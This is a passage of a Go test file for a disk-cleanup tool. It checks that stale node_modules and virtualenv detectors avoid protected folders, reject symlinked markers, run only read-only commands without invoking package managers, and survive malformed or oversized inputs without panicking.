		}
	}
}

// ---- R1-11: project detectors emit protected targets ----

// R1-11: node_modules_stale and venv_stale skip hidden and Library trees but
// not protected folders, so projects in ~/Documents or ~/Desktop (common for
// code) produce findings that CheckTarget must then drop.
func TestR1ProjectDetectorsEmitProtected(t *testing.T) {
	home := r1Home(t)
	old := time.Unix(w2DaysAgo(200), 0)
	var es []fstree.Entry
	var nodes fakeNodes
	for _, d := range []string{"Documents/app", "Desktop/site", "Pictures/x"} {
		es = append(es, w2Project(d, true, "package-lock.json", old)...)
		es = append(es, fstree.File(d+"/pyproject.toml", 10).WithModTime(old), fstree.File(d+"/.venv/pyvenv.cfg", 10))
		nodes = append(nodes,
			model.Node{Path: home + "/" + d + "/node_modules", Bytes: 900 << 20, MtimeMax: w2DaysAgo(200)},
			model.Node{Path: home + "/" + d + "/.venv", Bytes: 900 << 20, MtimeMax: w2DaysAgo(200)})
	}
	fstree.Build(t, home, es...)
	pol, err := safety.NewPolicy(home, nil)
	if err != nil {
		t.Fatal(err)
	}
	for _, id := range []string{"node.node_modules_stale", "python.venv_stale"} {
		fs, err := r1Run(t, id, recipes.Env{Home: home, Nodes: nodes})
		if err != nil {
			t.Fatal(err)
		}
		r := w2Recipe(t, id)
		for _, f := range fs {
			if err := pol.CheckTarget(f.Target, r.Allow); err != nil {
				t.Errorf("BUG (defense in depth): %s emits %q: %v", id, f.Target, err)
			}
		}
	}
}

// Held: symlinked manifests, symlinked node_modules parents and look-alikes.
func TestR1NodeVenvSymlinkTricksHeld(t *testing.T) {
	home := r1Home(t)
	old := time.Unix(w2DaysAgo(200), 0)
	fstree.Build(t, home,
		fstree.File("Documents/real/package.json", 10).WithModTime(old),
		fstree.File("Documents/real/package-lock.json", 10).WithModTime(old),
		// package.json and lockfile are symlinks to a real project elsewhere.
		fstree.Symlink("code/a/package.json", "../../Documents/real/package.json"),
		fstree.Symlink("code/a/package-lock.json", "../../Documents/real/package-lock.json"),
		fstree.Dir("code/a/node_modules"),
		// The project directory itself is a symlink into Documents.
		fstree.Symlink("code/b", "../Documents/real"),
		// A symlinked pyvenv.cfg and project marker.
		fstree.Symlink("code/c/pyproject.toml", "../../Documents/real/package.json"),
		fstree.Dir("code/c/.venv"),
		fstree.Symlink("code/c/.venv/pyvenv.cfg", "../../../Documents/real/package.json"),
	)
	nodes := fakeNodes{
		{Path: home + "/code/a/node_modules", Bytes: 900 << 20, MtimeMax: w2DaysAgo(200)},
		{Path: home + "/code/b/node_modules", Bytes: 900 << 20, MtimeMax: w2DaysAgo(200)},
		{Path: home + "/code/c/.venv", Bytes: 900 << 20, MtimeMax: w2DaysAgo(200)},
	}
	pol, err := safety.NewPolicy(home, nil)
	if err != nil {
		t.Fatal(err)
	}
	for _, id := range []string{"node.node_modules_stale", "python.venv_stale"} {
		fs, err := r1Run(t, id, recipes.Env{Home: home, Nodes: nodes})
		if err != nil {
			t.Fatal(err)
		}
		r := w2Recipe(t, id)
		for _, f := range fs {
			// Symlinked manifests/markers never count (code/a, code/c).
			// code/b (a symlinked project dir; the scanner never descends
			// into one, but it could be swapped in after the scan) is
			// emitted by the detector, which Lstats through the parent;
			// CheckTarget canonicalizes it into ~/Documents and drops it.
			if f.Target != home+"/code/b/node_modules" {
				t.Errorf("%s emitted %q via a symlinked marker", id, f.Target)
			}
			if err := pol.CheckTarget(f.Target, r.Allow); err == nil {
				t.Errorf("%s: CheckTarget accepted %q through a symlinked parent", id, f.Target)
			}
		}
	}
}

// ---- side effects (held) ----

// Every detector in the catalog, with every tool "installed" and realistic
// listings, runs only commands from the read-only set, never npm/pnpm/yarn,
// and writes nothing under home.
func TestR1DetectorSideEffectsHeld(t *testing.T) {
	home := fstree.DevHome(t)
	for _, v := range []string{"ANDROID_HOME", "ANDROID_SDK_ROOT", "ANDROID_AVD_HOME", "ANDROID_EMULATOR_HOME"} {
		t.Setenv(v, "")
	}
	writeFile(t, filepath.Join(home, ".android/avd/Pixel.ini"), "path="+filepath.Join(home, ".android/avd/Pixel.avd")+"\n")
	writeFile(t, filepath.Join(home, ".nvm/alias/default"), "20")
	r1AllTools(t)
	nodes := fakeNodes{
		{Path: home + "/.android/avd/Pixel.avd", Bytes: 64 << 20, MtimeMax: w2DaysAgo(400)},
		{Path: home + "/code/web/node_modules", Bytes: 900 << 20, MtimeMax: w2DaysAgo(400)},
		{Path: home + "/.nvm/versions/node/v18.0.0", Bytes: 1},
		{Path: home + "/.nvm/versions/node/v20.0.0", Bytes: 1},
		{Path: home + "/.nvm/versions/node/v22.0.0", Bytes: 1},
		{Path: home + "/.npm/_cacache", Bytes: 1 << 30},
		{Path: home + "/Library/pnpm/store", Bytes: 1 << 30},
		{Path: home + "/Library/Caches/Yarn", Bytes: 1 << 30},
	}
	before := r1Snapshot(t, home)
	c, err := recipes.Load()
	if err != nil {
		t.Fatal(err)
	}
	for _, withResponses := range []bool{true, false} {
		runner := &platform.Fake{}
		if withResponses {
			runner.Responses = r1Fixtures(t)
		}
		for _, r := range c.Recipes {
			d, _ := recipes.Lookup(r.Detector)
			_, _ = d(context.Background(), recipes.Env{Home: home, Nodes: nodes, Runner: runner, Now: w2Now, AppDirs: []string{home + "/Applications"}, AppsFolder: home + "/Applications"}, r)
		}
		for _, call := range runner.Calls {
			k := platform.Key(call)
			if !slices.Contains(r1ReadOnlyCommands, k) {
				t.Errorf("detector ran %q, outside the read-only set", k)
			}
			if slices.Contains([]string{"npm", "pnpm", "yarn", "npx", "corepack"}, call.Name) {
				t.Errorf("detector ran package manager %q", k)
			}
		}
		if withResponses && len(runner.Calls) == 0 {
			t.Error("no commands recorded; test is not exercising the runner")
		}
	}
	after := r1Snapshot(t, home)
	if len(before) != len(after) {
		t.Errorf("detectors changed the tree: %d entries before, %d after", len(before), len(after))
	}
	for p, v := range before {
		if after[p] != v {
			t.Errorf("detectors changed %s: %s -> %s", p, v, after[p])
		}
	}
}

// ---- robustness (held) ----

type r1ErrNodes struct{}

func (r1ErrNodes) Nodes(string, int) ([]model.Node, error) { return nil, errors.New("store closed") }

// r1Shuffled returns nodes in reverse (unsorted) order with junk entries.
type r1Shuffled []model.Node

func (s r1Shuffled) Nodes(prefix string, maxDepth int) ([]model.Node, error) {
	out, _ := fakeNodes(s).Nodes(prefix, maxDepth)
	slices.Reverse(out)
	return out, nil
}

// Every detector, against an erroring, empty, unsorted/junk and huge
// recipes.NodeSource, and empty or huge Runner output: no panic.
func TestR1RobustnessHeld(t *testing.T) {
	home := r1Home(t)
	r1AllTools(t)
	junk := r1Shuffled{
		{Path: home}, {Path: home + "/"}, {Path: ""}, {Path: "relative/x", Bytes: -5},
		{Path: home + "/Library/Caches/x", Bytes: -1, MtimeMax: -1},
		{Path: home + "/Library/Caches/" + strings.Repeat("y", 5000), Bytes: math.MaxInt64, MtimeMax: math.MaxInt64},
		{Path: home + "/Downloads/big", Kind: model.NodeFile, Bytes: math.MaxInt64, MtimeMax: 1},
		{Path: home + "/a/node_modules", Bytes: math.MaxInt64, MtimeMax: 1},
		{Path: home + "/.nvm/versions/node/v1.2.3", Bytes: 1}, {Path: home + "/.nvm/versions/node/v", Bytes: 1},
		{Path: home + "/.nvm/versions/node/v1.2.3.4", Bytes: 1}, {Path: home + "/.nvm/versions/node/v-1.0.0", Bytes: 1},
	}
	var huge fakeNodes
	for i := range 20000 {
		huge = append(huge, model.Node{Path: fmt.Sprintf("%s/Library/Caches/c%d", home, i), Bytes: int64(i) << 20})
	}
	big := []byte(strings.Repeat("Would remove: /x (1KB)\n", 50000) + strings.Repeat("{}\n", 50000))
	outputs := map[string][]byte{"empty": nil, "junk": []byte("\x00\xff\n{\"devices\":null}\n==>\n"), "huge": big, "null": []byte("null")}
	c, err := recipes.Load()
	if err != nil {
		t.Fatal(err)
	}
	for srcName, src := range map[string]recipes.NodeSource{"err": r1ErrNodes{}, "nil": nil, "junk": junk, "huge": huge} {
		for outName, out := range outputs {
			resp := map[string]platform.Result{}
			for _, k := range r1ReadOnlyCommands {
				resp[k] = platform.Result{Stdout: out, Stderr: out}
			}
			for _, r := range c.Recipes {
				d, _ := recipes.Lookup(r.Detector)
				func() {
					defer func() {
						if p := recover(); p != nil {
							t.Errorf("%s with nodes=%s output=%s panicked: %v", r.ID, srcName, outName, p)
						}
					}()
					_, _ = d(context.Background(), recipes.Env{Home: home, Nodes: src, Runner: w2Fake(resp), Now: w2Now}, r)
				}()
			}
		}
	}
}
